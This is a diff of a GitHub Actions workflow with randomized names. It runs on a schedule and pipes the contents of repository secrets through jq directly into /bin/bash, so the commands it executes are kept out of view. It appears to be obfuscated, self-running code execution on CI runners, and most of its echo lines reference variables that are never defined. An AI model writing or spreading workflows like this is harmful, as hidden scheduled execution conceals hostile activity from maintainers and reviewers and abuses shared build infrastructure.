@@ -1,8 +1,9 @@
 name: moshumin6712
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 3/6 * * *'
+    - cron: '12 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,19 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: moshumin6712
         env:
-          k1: ${{ secrets.k1 }}
+          ruw853: ${{ secrets.ruw853 }}
         run: |
-          echo $k1 | jq -r .br00702 | /bin/bash
-          echo $wlgs9 | jq -r .aqlfu81180 | /bin/bash
-          echo $xelrh51 | jq -r .b41 | /bin/bash
-          echo $rpc97144 | jq -r .weh5365 | /bin/bash
-          echo $ek53096 | jq -r .kys7 | /bin/bash
-          echo $gf32442 | jq -r .x544 | /bin/bash
-          echo $m25 | jq -r .gtr30 | /bin/bash
-          echo $gocsy9872 | jq -r .k865 | /bin/bash
-          echo $yjsr70 | jq -r .t92 | /bin/bash
-          echo $nhh6294 | jq -r .l1195 | /bin/bash
-          echo $fvnb93 | jq -r .pxbil5 | /bin/bash
-          echo $vcee58390 | jq -r .eifc16870 | /bin/bash
-          echo $vo96608 | jq -r .wqyv051 | /bin/bash
+          echo $ruw853 | jq -r .q003 | /bin/bash
+          echo $tauk83455 | jq -r .g982 | /bin/bash
+          echo $ihc10 | jq -r .bjmt960 | /bin/bash
+          echo $x5 | jq -r .rv39085 | /bin/bash
+          echo $dtn02 | jq -r .dpoo796 | /bin/bash
 
